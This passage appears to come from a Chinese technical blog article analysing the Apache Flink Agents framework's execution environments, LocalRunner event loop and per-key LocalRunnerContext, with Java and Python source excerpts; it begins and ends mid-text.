<li>对“业务语义”一无所知，也不管用户写的是 ETL、CEP 还是 AI 推理</li>
<li>对应 Agent 词汇表里的“Runtime / Cluster / Engine”这一层</li>
</ul>
</li>
<li>
<p>Agent Environment = 在 Flink Runtime 之上包了一层<strong>语义抽象</strong></p>
<ul>
<li>替用户注册 Chat Model、Tools、Memory、Actions、Event Schema</li>
<li>把“用户消息”或“传感器事件”封装成 Event，按 AgentPlan 去调大模型、执行业务动作</li>
<li>内部仍然用 <code>StreamExecutionEnvironment</code> 去提交算子，只是看不到显式的 <code>keyBy()</code> 和 <code>process()</code>——框架帮用户生成了 <code>ActionExecutionOperator</code></li>
</ul>
</li>
</ol>
<p>类比关系如下：</p>
<pre><code class="hljs">传统 Flink 程序
├─ StreamExecutionEnvironment   ← 纯运行时
├─ your ProcessFunction         ← 用户的业务逻辑
└─ DataStream

Flink Agents 程序
├─ AgentsExecutionEnvironment   ← Agent 语义环境，内部仍持有 StreamExecutionEnvironment
├─ AgentPlan（your business）   ← 定义“遇到啥事件该干啥”
└─ ActionExecutionOperator     ← 框架替用户生成的算子，负责调大模型、更新记忆
</code></pre>
<h4 data-id="heading-3">1.1 定义</h4>
<p>AgentsExecutionEnvironment 的代码如下。</p>
<pre><code class="hljs language-vbnet" lang="vbnet">/**
 * Base <span class="hljs-keyword">class</span> <span class="hljs-keyword">for</span> agent execution environment.
 *
 * &lt;p&gt;This <span class="hljs-keyword">class</span> provides the main entry point <span class="hljs-keyword">for</span> integrating Flink Agents <span class="hljs-keyword">with</span> different types <span class="hljs-keyword">of</span>
 * Flink data sources (DataStream, Table, <span class="hljs-built_in">or</span> simple lists).
 */
<span class="hljs-keyword">public</span> abstract <span class="hljs-keyword">class</span> AgentsExecutionEnvironment {
    <span class="hljs-keyword">protected</span> final Map&lt;ResourceType, Map&lt;<span class="hljs-type">String</span>, <span class="hljs-type">Object</span>&gt;&gt; resources;

    <span class="hljs-keyword">protected</span> AgentsExecutionEnvironment() {
        this.resources = <span class="hljs-built_in">new</span> HashMap&lt;&gt;();
        <span class="hljs-keyword">for</span> (ResourceType type : ResourceType.values()) {
            this.resources.put(type, <span class="hljs-built_in">new</span> HashMap&lt;&gt;());
        }
    }
    
    /**
     * <span class="hljs-keyword">Get</span> agents execution environment.
     *
     * &lt;p&gt;Factory method that creates an appropriate execution environment based <span class="hljs-keyword">on</span> the provided
     * StreamExecutionEnvironment. <span class="hljs-keyword">If</span> no environment <span class="hljs-built_in">is</span> provided, a local execution environment <span class="hljs-built_in">is</span>
     * returned <span class="hljs-keyword">for</span> testing <span class="hljs-built_in">and</span> development.
     *
     * &lt;p&gt;<span class="hljs-keyword">When</span> integrating <span class="hljs-keyword">with</span> Flink DataStream/Table APIs, users should pass the Flink
     * StreamExecutionEnvironment <span class="hljs-keyword">to</span> enable remote execution capabilities.
     *
     * @param env <span class="hljs-keyword">Optional</span> StreamExecutionEnvironment <span class="hljs-keyword">for</span> remote execution. <span class="hljs-keyword">If</span> null, a local
     *     execution environment will be created.
     * @param tEnv <span class="hljs-keyword">Optional</span> StreamTableEnvironment <span class="hljs-keyword">for</span> table-<span class="hljs-keyword">to</span>-stream conversion.
     * @<span class="hljs-keyword">return</span> AgentsExecutionEnvironment appropriate <span class="hljs-keyword">for</span> the execution context.
     */
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> AgentsExecutionEnvironment getExecutionEnvironment(
            StreamExecutionEnvironment env, @Nullable StreamTableEnvironment tEnv) {
        <span class="hljs-keyword">if</span> (env == null) {
            // <span class="hljs-keyword">Return</span> local execution environment <span class="hljs-keyword">for</span> testing/development
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">Class</span>&lt;?&gt; localEnvClass =
                        <span class="hljs-keyword">Class</span>.forName(                                <span class="hljs-string">"org.apache.flink.agents.runtime.env.LocalExecutionEnvironment"</span>);
                <span class="hljs-keyword">return</span> (AgentsExecutionEnvironment)
                        localEnvClass.getDeclaredConstructor().newInstance();
            } <span class="hljs-keyword">catch</span> (Exception e) {
                <span class="hljs-keyword">throw</span> <span class="hljs-built_in">new</span> RuntimeException(<span class="hljs-string">"Failed to create LocalExecutionEnvironment"</span>, e);
            }
        } <span class="hljs-keyword">else</span> {
            // <span class="hljs-keyword">Return</span> remote execution environment <span class="hljs-keyword">for</span> Flink integration
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">Class</span>&lt;?&gt; remoteEnvClass =
                        <span class="hljs-keyword">Class</span>.forName(                                <span class="hljs-string">"org.apache.flink.agents.runtime.env.RemoteExecutionEnvironment"</span>);
                <span class="hljs-keyword">return</span> (AgentsExecutionEnvironment)
                        remoteEnvClass
                                .getDeclaredConstructor(
                                        StreamExecutionEnvironment.<span class="hljs-keyword">class</span>,
                                        StreamTableEnvironment.<span class="hljs-keyword">class</span>)
                                .newInstance(env, tEnv);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                <span class="hljs-keyword">throw</span> <span class="hljs-built_in">new</span> RuntimeException(<span class="hljs-string">"Failed to create RemoteExecutionEnvironment"</span>, e);
            }
        }
    }    
</code></pre>
<h4 data-id="heading-4">1.2 功能</h4>
<p>AgentsExecutionEnvironment 的功能如下：</p>
<ul>
<li>
<p>统一入口：</p>
<ul>
<li>提供getExecutionEnvironment()系列静态工厂方法，可以依据是否传入Flink的 StreamExecutionEnvironment来创建本地或远程执行环境。</li>
<li>支持从不同数据源构建构建Agent管道，包括List，DataStream和Table。</li>
</ul>
</li>
<li>
<p>资源配置管理：</p>
<ul>
<li>内置 resources 映射结构，支持按照资源类型管理各种资源。</li>
<li>提供 addResource() 方法注册可序列化的资源或者资源描述符。</li>
</ul>
</li>
<li>
<p>多输入源支持：</p>
<ul>
<li>fromList()：支持从简单列表创建本地执行环境。</li>
<li>fromDataStream()：集成Flink DataStream API</li>
<li>fromTable()：集成Flink Table API</li>
</ul>
</li>
<li>
<p>配置管理：</p>
<ul>
<li>提供getConfig()抽象方法获取可写的配置对象。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-5">1.3 与原生 Flink Environment 的区别</h4>
<ul>
<li>抽象层级更高：AgentExecutionEnvrionment是对Flink原生环境的封装，在其之上提供了面向Agent的编程模型。主要用于运行Agent，而非 直接处理数据流。</li>
<li>执行模式：AgentExecutionEnvrionment 通过 LocalExecutionEnvironment 和 RemoteExecutionEnvironment 分别支持本地测试和远程集群执行。原生 Flink 主要通过配置参数控制执行模式。</li>
<li>资源管理机制：AgentExecutionEnvrionment 内置了专门的资源注册和管理机制，支持按类型分类管理支援。原生 Flink 没有这种结构化的资源管理方式。</li>
<li>API 设计目标：面向 Agent 编程范式，强调事件驱动的自主行为体模型。原生Flink 更关注数据流处理和批处理操作。</li>
</ul>
<h3 data-id="heading-6">0x02 LocalExecutionEnvironment</h3>
<p>LocalExecutionEnvironment 是 AgentsExecutionEnvironment 的一种实现形式。</p>
<pre><code class="hljs language-ini" lang="ini">Class&lt;?&gt; <span class="hljs-attr">localEnvClass</span> = Class.forName(                                <span class="hljs-string">"org.apache.flink.agents.runtime.env.LocalExecutionEnvironment"</span>)<span class="hljs-comment">;</span>
                return (AgentsExecutionEnvironment)
                        localEnvClass.getDeclaredConstructor().newInstance()<span class="hljs-comment">;</span>
</code></pre>
<p>LocalExecutionEnvironment 主要用于</p>
<ul>
<li>开发阶段的快速测试和调试</li>
<li>无需 Flink 集群即可验证代理逻辑</li>
<li>简化Agent应用的本地开发流程</li>
<li>它与远程执行环境形成对比，后者支持完整的 Flink DataStream 和 Table API 集成。</li>
</ul>
<h4 data-id="heading-7">2.1 定义</h4>
<h5 data-id="heading-8">2.1.1 主要功能</h5>
<p>LocalExecutionEnvironment 的主要功能如下：</p>
<ul>
<li>
<p>本地执行环境实现</p>
<ul>
<li>集成自 AgentExecutionEnvrionment，为本地测试和开发提供执行环境</li>
<li>不依赖 Flink 集群，可以在本地环境中运行和调试代理</li>
</ul>
</li>
<li>
<p>数据源支持</p>
<ul>
<li>通过from_list方法支持从列表数据源读取输入数据</li>
<li>不支持 Flink 的DataStream 和 Table API（这些在远程执行环境中使用）</li>
</ul>
</li>
<li>
<p>资源配置和管理</p>
<ul>
<li>存储和管理通过 add_resource 方法注册的资源</li>
<li>在构建Agent时，将环境中的资源注入到Agent实例中</li>
</ul>
</li>
<li>
<p>代理执行管理</p>
<ul>
<li>通过 set_agent 方法设置待执行的Agent、输入和输出</li>
<li>使用 LocalRunner 在本地执行代理逻辑</li>
<li>通过 execute 方法触发代理执行</li>
</ul>
</li>
<li>
<p>结果收集</p>
<ul>
<li>收集Agent执行的输出结果</li>
<li>通过 to_list 方法返回执行结果</li>
</ul>
</li>
</ul>
<p>根据代码分析， execute 函数在以下情况下被调用：</p>
<ul>
<li>用户手动调用。当用户完成代理配置和输入数据设置后，需要显式调用execute() 方法来启动Agent 执行流程，这通常式配置完所有必要组件后的最后一步。</li>
</ul>
<h5 data-id="heading-9">2.1.2 代码</h5>
<p>LocalExecutionEnvironment 的定义如下，其中 LocalRunner 是核心。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalExecutionEnvironment</span>(<span class="hljs-title class_ inherited__">AgentsExecutionEnvironment</span>):
    <span class="hljs-string">"""Implementation of AgentsExecutionEnvironment for local execution environment."""</span>

    __<span class="hljs-built_in">input</span>: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]] = <span class="hljs-literal">None</span>
    __output: <span class="hljs-type">List</span>[<span class="hljs-type">Any</span>] = <span class="hljs-literal">None</span>
    __runner: LocalRunner = <span class="hljs-literal">None</span>
    __executed: <span class="hljs-built_in">bool</span> = <span class="hljs-literal">False</span>
    __config: AgentConfiguration = AgentConfiguration()
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_agent</span>(<span class="hljs-params">self, <span class="hljs-built_in">input</span>: <span class="hljs-built_in">list</span>, output: <span class="hljs-built_in">list</span>, runner: LocalRunner</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Set agent input, output and runner."""</span>
        self.__<span class="hljs-built_in">input</span> = <span class="hljs-built_in">input</span>
        self.__runner = runner
        self.__output = output

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">execute</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Execute agent individually."""</span>
        <span class="hljs-keyword">if</span> self.__executed:
            err_msg = (
                <span class="hljs-string">"LocalExecutionEnvironment doesn't support execute multiple times."</span>
            )
            <span class="hljs-keyword">raise</span> RuntimeError(err_msg)
        self.__executed = <span class="hljs-literal">True</span>
        <span class="hljs-keyword">for</span> <span class="hljs-built_in">input</span> <span class="hljs-keyword">in</span> self.__<span class="hljs-built_in">input</span>:
            self.__runner.run(**<span class="hljs-built_in">input</span>)
        outputs = self.__runner.get_outputs()
        <span class="hljs-keyword">for</span> output <span class="hljs-keyword">in</span> outputs:
            self.__output.append(output)        
</code></pre>
<h5 data-id="heading-10">2.1.3 执行流程</h5>
<p>在 LocalExecutionEnvironment 中，execute 方法会：</p>
<ul>
<li>遍历所有输入数据项</li>
<li>对每个输入调用 LocalRunner 的run方法进行处理</li>
<li>收集所有输出结果</li>
</ul>
<p>典型的调用序列如下：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 1. 获取执行环境</span>
<span class="hljs-attr">env</span> = StreamExecutionEnvironment.get_execution_environment()
<span class="hljs-comment"># 2. 添加所需资源</span>
env.add_resource(...)
<span class="hljs-comment"># 3. 设置输入数据</span>
<span class="hljs-attr">output_data</span> = env.from_list(input_data) 
<span class="hljs-comment"># 4. 应用代理</span>
builder.apply(agent) 
<span class="hljs-comment"># 5. 执行代理</span>
env.execute()
<span class="hljs-comment"># 6. 获取结果</span>
<span class="hljs-attr">results</span> = builder.to_list()
</code></pre>
<p>关键特点：</p>
<ul>
<li>手动触发： execute() 不会自动调用，必须由用户显式调用</li>
<li>一次性执行：只能调用一次，多次调用会抛出异常</li>
<li>阻塞操作：在本地环境中，这是个同步阻塞操作，会等待所有输入处理完成</li>
</ul>
<h5 data-id="heading-11">2.1.4 组件关系</h5>
<p>组件关系图如下：</p>
<pre><code class="hljs language-scss" lang="scss">LocalExecutionEnvironmet
    ↓
    ↓ creates
LocalAgentBuilder
    ↓
    ↓ creates
LocalRunner
    ↓
    ↓ creates &amp; <span class="hljs-built_in">run</span>(data)
LocalRunnerContext
</code></pre>
<p>关系说明：</p>
<ul>
<li>LocalExecutionEnvironmet 是入口点，管理整个执行环境。通过 from_list() 创建LocalAgentBuilder</li>
<li>LocalAgentBuilder 负责构建Agent 执行管道，通过 apply() 创建 LocalRunner</li>
<li>LocalRunner 是实际的执行器</li>
<li>LocalRunner 为每个处理的记录创建 LocalRunnerContext</li>
</ul>
<h4 data-id="heading-12">2.2 LocalRunner</h4>
<p>LocalRunner 是本地执行环境中的核心执行器，负责实际运行Agent逻辑。LocalRunner 提供了一个完整的本地执行环境，模拟了Flink 流处理的行为，使得Agent可以在本地进行开发和测试。</p>
<h5 data-id="heading-13">2.2.1 LocalRunner 的主要功能</h5>
<p>LocalRunner 的主要功能：</p>
<ul>
<li>代理执行：将Agent转换为可执行的计划并执行</li>
<li>上下文管理：为每个处理单元创建和管理 LocalRunnerContext</li>
<li>事件处理：管理事件队列并驱动Agent的执行流程</li>
<li>结果收集：收集和存储Agent执行的输出结果</li>
</ul>
<p>run函数是LocalRunner的核心方法，负责处理单个输入记录：</p>
<ul>
<li>
<p>从输入数据中提取键值，用于上下文管理</p>
</li>
<li>
<p>为每个键创建或复用 LocalRunnerContext</p>
</li>
<li>
<p>将输入数据包装成 InputEvent 并发送到事件队列</p>
</li>
<li>
<p>事件循环处理，LocalRunner 的 run 函数使用 while 循环是为了处理事件驱动的代理执行模型。这种设计反映了代理执行的核心机制</p>
<ul>
<li>持续处理事件队列直到为空</li>
<li>如果是输出事件、收集结果</li>
<li>根据事件类型查找对应的动作</li>
<li>执行动作</li>
<li>处理异步处理结果</li>
</ul>
</li>
</ul>

<pre><code class="hljs language-python" lang="python">    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, **data: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]</span>) -&gt; <span class="hljs-type">Any</span>:
        <span class="hljs-string">"""Execute the agent to process the given data.

        Parameters
        ----------
        **data : dict[str, Any]
            input record from upstream.

        Returns:
        -------
        key
            The key of the input that was processed.
        """</span>
        <span class="hljs-keyword">if</span> <span class="hljs-string">"key"</span> <span class="hljs-keyword">in</span> data:
            key = data[<span class="hljs-string">"key"</span>]
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"k"</span> <span class="hljs-keyword">in</span> data:
            key = data[<span class="hljs-string">"k"</span>]
        <span class="hljs-keyword">else</span>:
            key = uuid.uuid4()

        <span class="hljs-keyword">if</span> key <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.__keyed_contexts:
            self.__keyed_contexts[key] = LocalRunnerContext(self.__agent_plan, key, self.__config)
        context = self.__keyed_contexts[key]

        <span class="hljs-keyword">if</span> <span class="hljs-string">"value"</span> <span class="hljs-keyword">in</span> data:
            input_event = InputEvent(<span class="hljs-built_in">input</span>=data[<span class="hljs-string">"value"</span>])
        <span class="hljs-keyword">elif</span> <span class="hljs-string">"v"</span> <span class="hljs-keyword">in</span> data:
            input_event = InputEvent(<span class="hljs-built_in">input</span>=data[<span class="hljs-string">"v"</span>])
        <span class="hljs-keyword">else</span>:
            msg = <span class="hljs-string">"Input data must be dict has 'v' or 'value' field"</span>
            <span class="hljs-keyword">raise</span> RuntimeError(msg)

        context.send_event(input_event)

        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(context.events) &gt; <span class="hljs-number">0</span>:
            event = context.events.popleft()
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(event, OutputEvent):
                self.__outputs.append({key: event.output})
                <span class="hljs-keyword">continue</span>
            event_type = <span class="hljs-string">f"<span class="hljs-subst">{event.__class__.__module__}</span>.<span class="hljs-subst">{event.__class__.__name__}</span>"</span>
            <span class="hljs-keyword">for</span> action <span class="hljs-keyword">in</span> self.__agent_plan.get_actions(event_type):
                context.action_name = action.name
                func_result = action.<span class="hljs-built_in">exec</span>(event, context)
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(func_result, Generator):
                    <span class="hljs-keyword">try</span>:
                        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> func_result:
                            <span class="hljs-keyword">pass</span>
                    <span class="hljs-keyword">except</span> Exception:
                        logger.exception(<span class="hljs-string">"Error in async execution"</span>)
                        <span class="hljs-keyword">raise</span>
        <span class="hljs-keyword">return</span> key
</code></pre>
<h5 data-id="heading-14">2.2.2 事件驱动执行模型</h5>
<p>在 Flink Agents 框架中，代理的执行是基于事件的。每个动作 (action)处理一个事件并可能产生新的事件，这些新事件又会触发其他动作的执行。因此需要一个循环来持续处理事件队列中的事件，直到没有更多事件需要处理。</p>
<p>这种设计使得代理可以处理复杂的、多步骤的交互过程，而不需要预先确定执行步骤的数量。<code>while</code> 循环确保所有相关的事件都被处理完毕，形成了一个完整的事件处理链：</p>
<ul>
<li>持续从事件队列 context.events 中取出事件进行处理</li>
<li>每个事件可能触发一个或多个动作的执行</li>
<li>动作执行可能产生新的事件，这些事件被添加回队列</li>
</ul>
<p>递归事件处理：</p>
<ul>
<li>初始时只有一个 InputEvent</li>
<li>动作处理 InputEvent 可能产生 ChatRequestEvent 等中间事件</li>
<li>中间事件可能触发其他动作，产生更多事件</li>
<li>最终产生 OutputEvent 完成处理</li>
</ul>
<p>完整处理链：</p>
<pre><code class="hljs">InputEvent  → →   start_action  → →   ChatRequestEvent  →  →  LLM处理  → →  ChatResponseEvent  → →   stop_action  → →   OutputEvent
</code></pre>
<p>具体执行流程</p>
<ul>
<li>
<p>初始化：</p>
<ul>
<li>将输入数据包装成 InputEvent 并添加到事件队列</li>
</ul>
</li>
<li>
<p>循环处理：</p>
<ul>
<li>从队列取出事件</li>
<li>根据事件类型找到对应的 actions</li>
<li>执行所有监听该事件类型的动作</li>
<li>动作可能通过 send_event 发送新事件到队列</li>
</ul>
</li>
<li>
<p>终止条件：</p>
<ul>
<li>当事件队列为空时，处理完成</li>
</ul>
</li>
</ul>
<h5 data-id="heading-15">2.2.3 AgentPlan 和 LocalRunner 的关系</h5>
<ul>
<li>LocalRunner 在初始化时候使用 AgentPlan</li>
<li>在执行过程中，LocalRunnerContext 通过 AgentPlan 获取资源和动作</li>
<li>在事件处理中查找对应的动作</li>
</ul>
<p>具体为：LocalRunner 在初始化时候使用 AgentPlan</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalRunner</span>(<span class="hljs-title class_ inherited__">AgentRunner</span>):
    <span class="hljs-string">"""Agent runner implementation for local execution, which is
    convenient for debugging.

    Attributes:
    ----------
    __agent_plan : AgentPlan
        Internal agent plan.
    __keyed_contexts : dict[Any, LocalRunnerContext]
        Dictionary of active contexts indexed by key.
    __outputs:
        Outputs generated by agent execution.
    __config:
        Internal configration.
    """</span>

    __agent_plan: AgentPlan
    __keyed_contexts: <span class="hljs-type">Dict</span>[<span class="hljs-type">Any</span>, LocalRunnerContext]
    __outputs: <span class="hljs-type">List</span>[<span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]]
    __config: AgentConfiguration

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, agent: Agent, config: AgentConfiguration</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Initialize the runner with the provided agent.

        Parameters
        ----------
        agent : Agent
            The agent class to convert and run.
        """</span>
        self.__agent_plan = AgentPlan.from_agent(agent, config)
        self.__keyed_contexts = {}
        self.__outputs = []
        self.__config = config
</code></pre>
<p>具体为：在执行过程中，LocalRunnerContext 通过 AgentPlan 获取资源和动作</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalRunnerContext</span>(<span class="hljs-title class_ inherited__">RunnerContext</span>):
    <span class="hljs-string">"""Implementation of RunnerContext for local agent execution.

    Attributes:
    ----------
    __agent_plan : AgentPlan
        Internal agent plan for this context.
    __key : Any
        Unique identifier for the context, correspond to the key in flink KeyedStream.
    events : deque[Event]
        Queue of events to be processed in this context.
    action_name: str
        Name of the action being executed.
    """</span>

    __agent_plan: AgentPlan
    __key: <span class="hljs-type">Any</span>
    events: deque[Event]
    action_name: <span class="hljs-built_in">str</span>
    _store: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]
    _short_term_memory: MemoryObject
    _config: AgentConfiguration

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, agent_plan: AgentPlan, key: <span class="hljs-type">Any</span>, config: AgentConfiguration</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Initialize a new context with the given agent and key.

        Parameters
        ----------
        agent_plan : AgentPlan
            Agent plan used for this context.
        key : Any
            Unique context identifier, which is corresponding to the key in flink
            KeyedStream.
        """</span>
        self.__agent_plan = agent_plan
        self.__key = key
        self.events = deque()
        self._store = {}
        self._short_term_memory = LocalMemoryObject(
            self._store, LocalMemoryObject.ROOT_KEY
        )
        self._config = config
        
    @override
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_resource</span>(<span class="hljs-params">self, name: <span class="hljs-built_in">str</span>, <span class="hljs-built_in">type</span>: ResourceType</span>) -&gt; Resource:
        <span class="hljs-keyword">return</span> self.__agent_plan.get_resource(name, <span class="hljs-built_in">type</span>)        
</code></pre>
<p>具体为：在事件处理中查找对应的动作</p>
<pre><code class="hljs language-python" lang="python">            <span class="hljs-keyword">for</span> action <span class="hljs-keyword">in</span> self.__agent_plan.get_actions(event_type):
                context.action_name = action.name
                func_result = action.<span class="hljs-built_in">exec</span>(event, context) <span class="hljs-comment"># 执行</span>
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(func_result, Generator):
                    <span class="hljs-keyword">try</span>:
                        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> func_result:
                            <span class="hljs-keyword">pass</span>
                    <span class="hljs-keyword">except</span> Exception:
                        logger.exception(<span class="hljs-string">"Error in async execution"</span>)
                        <span class="hljs-keyword">raise</span>
</code></pre>
<h5 data-id="heading-16">2.2.4 为什么要为每种 key 维护独立的上下文</h5>
<p>在 LocalRunner 中，每种 key 都有自己独立的上下文是为了模拟 Flink 流处理环境中 keyed state 的行为，并支持状态隔离和并发处理。</p>
<ul>
<li><strong>状态隔离</strong>：每个 key 对应的数据流需要维护自己的状态，避免不同 key 的数据相互干扰：</li>
</ul>

<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># 不同 key 的状态完全隔离</span>
key1_context.short_term_memory.<span class="hljs-keyword">set</span>(<span class="hljs-string">"user_name"</span>, <span class="hljs-string">"Alice"</span>)
key2_context.short_term_memory.<span class="hljs-keyword">set</span>(<span class="hljs-string">"user_name"</span>, <span class="hljs-string">"Bob"</span>)
<span class="hljs-meta"># 两个 key 有不同的状态值，互不影响</span>
</code></pre>
<ul>
<li>
<p><strong>模拟 Flink 的 KeyedStream 行为</strong>：在 Flink 中，当使用 <code>keyBy()</code> 操作时，每个 key 会有独立的状态管理。LocalRunner 通过这种方式模拟了相同的行为：</p>
<ul>
<li>相同 key 的事件会在同一个上下文中处理</li>
<li>不同 key 的事件拥有各自独立的内存和事件队列</li>
</ul>
<p>这样保证了本地调试环境与实际 Flink 环境的一致性</p>
</li>
<li>
<p><strong>支持并发处理</strong>：虽然 LocalRunner 是单线程运行的，但它模拟了多 key 并发处理的情况：</p>
</li>
</ul>

<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 可以同时处理多个 key 的数据</span>
<span class="hljs-string">for</span> <span class="hljs-string">input_record</span> <span class="hljs-string">in</span> <span class="hljs-attr">inputs:</span>
    <span class="hljs-string">runner.run(**input_record)</span>  <span class="hljs-comment"># 每个 key 有独立上下文</span>
</code></pre>
<ul>
<li>
<p><strong>事件队列隔离</strong>：每个 key 都有自己的事件队列（events），这样可以保证：</p>
<ul>
<li>同一 key 的事件按顺序处理</li>
<li>不同 key 的事件不会互相影响处理顺序</li>
<li>每个 key 可以独立地维护待处理事件队列</li>
</ul>
</li>
<li>
<p><strong>内存状态管理</strong>：每个 LocalRunnerContext 都有自己的短期记忆对象（_short_term_memory），允许：</p>
</li>
</ul>

<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># 每个 key 可以存储和检索自己的状态</span>
context.short_term_memory.<span class="hljs-keyword">set</span>(<span class="hljs-string">"step_count"</span>, <span class="hljs-number">1</span>)
context.short_term_memory.<span class="hljs-keyword">get</span>(<span class="hljs-string">"step_count"</span>)  <span class="hljs-meta"># 获取该 key 特定的状态</span>
</code></pre>
<h5 data-id="heading-17">2.2.5 实际应用场景示例</h5>
<p>考虑一个客户服务聊天机器人应用：</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 用户 Alice 和 Bob 的对话分别用不同的 key 处理</span>
runner.run(<span class="hljs-attr">key</span>=<span class="hljs-string">"user_alice"</span>, value={<span class="hljs-string">"message"</span>: <span class="hljs-string">"Hello"</span>})
runner.run(<span class="hljs-attr">key</span>=<span class="hljs-string">"user_bob"</span>, value={<span class="hljs-string">"message"</span>: <span class="hljs-string">"Hi there"</span>})
<span class="hljs-comment"># 每个用户的对话历史和状态都独立保存</span>
<span class="hljs-comment"># Alice 的上下文不会影响 Bob 的上下文，反之亦然</span>
</code></pre>
<p>这种设计使 LocalRunner 能够准确模拟真实分布式环境中的行为，方便开发者在本地测试和调试复杂的状态依赖型代理应用。</p>
<h4 data-id="heading-18">2.3 LocalRunnerContext</h4>
<p>LocalRunnerContext 是 Flink Agents 框架中用于本地执行环境的运行上下文实现。它的主要功能是为每个 key 提供独立的执行环境，模拟 Flink 分布式环境中 keyed state 的行为，确保了在本地环境中能够准确模拟基于 key 的状态管理和事件处理流程。</p>
<h5 data-id="heading-19">2.3.1 设计目的</h5>
<p>LocalRunnerContext 的设计主要是为了：</p>
<ul>
<li>本地调试：在本地环境中模拟 Flink 分布式执行的行为</li>
<li>状态隔离：确保不同 key 的处理状态完全隔离，避免相互干扰</li>
<li>行为一致性：保证本地测试环境与实际 Flink 执行环境的行为一致</li>
<li>简化开发：提供与生产环境相同的 API 接口，方便开发者测试和调试</li>
</ul>
<h5 data-id="heading-20">2.3.2 主要功能</h5>
<ul>
<li>
<p>状态管理</p>
<ul>
<li>为每个 key 维护独立的短期内存状态（_short_term_memory）</li>
<li>提供内存对象的读写操作，确保不同 key 的状态隔离</li>
</ul>
</li>
<li>
<p>事件处理</p>
<ul>
<li>维护每个 key 的事件队列（events）</li>
<li>提供 send_event 方法将事件添加到处理队列中</li>
<li>记录事件处理日志，便于调试</li>
</ul>
</li>
<li>
<p>资源访问</p>
<ul>
<li>提供 get_resource 方法访问 agent 所需的资源（如模型、工具等）</li>
<li>根据资源名称和类型获取相应的资源实例</li>
</ul>
</li>
<li>
<p>配置管理</p>
<ul>
<li>提供对 action 配置的访问（action_config, get_action_config_value）</li>
<li>提供全局配置信息（config）</li>
</ul>
</li>
<li>
<p>度量和监控</p>
<ul>
<li>提供度量组访问接口（agent_metric_group, action_metric_group）</li>
<li>目前在本地环境中尚未完全实现</li>
</ul>
</li>
<li>
<p>异步执行支持</p>
<ul>
<li>提供 execute_async 方法支持异步函数执行</li>
<li>在本地环境中降级为同步执行并给出警告</li>
</ul>
</li>
</ul>
<h5 data-id="heading-21">2.3.3 定义</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalRunnerContext</span>(<span class="hljs-title class_ inherited__">RunnerContext</span>):
    <span class="hljs-string">"""Implementation of RunnerContext for local agent execution.

    Attributes:
    ----------
    __agent_plan : AgentPlan
        Internal agent plan for this context.
    __key : Any
        Unique identifier for the context, correspond to the key in flink KeyedStream.
    events : deque[Event]
        Queue of events to be processed in this context.
    action_name: str
        Name of the action being executed.
    """</span>

    __agent_plan: AgentPlan
    __key: <span class="hljs-type">Any</span>
    events: deque[Event]
    action_name: <span class="hljs-built_in">str</span>
    _store: <span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]
    _short_term_memory: MemoryObject
    _config: AgentConfiguration

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, agent_plan: AgentPlan, key: <span class="hljs-type">Any</span>, config: AgentConfiguration</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-string">"""Initialize a new context with the given agent and key.

        Parameters
        ----------
        agent_plan : AgentPlan
            Agent plan used for this context.
        key : Any
            Unique context identifier, which is corresponding to the key in flink
            KeyedStream.
        """</span>
        self.__agent_plan = agent_plan
        self.__key = key
        self.events = deque()
        self._store = {}
        self._short_term_memory = LocalMemoryObject(
            self._store, LocalMemoryObject.ROOT_KEY
        )
        self._config = config

    @<span class="hljs-built_in">property</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">key</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-type">Any</span>:
        <span class="hljs-string">"""Get the unique identifier for this context.

        Returns:
        -------
        Any
            The unique identifier for this context.
        """</span>
        <span class="hljs-keyword">return</span> self.__key

    @override
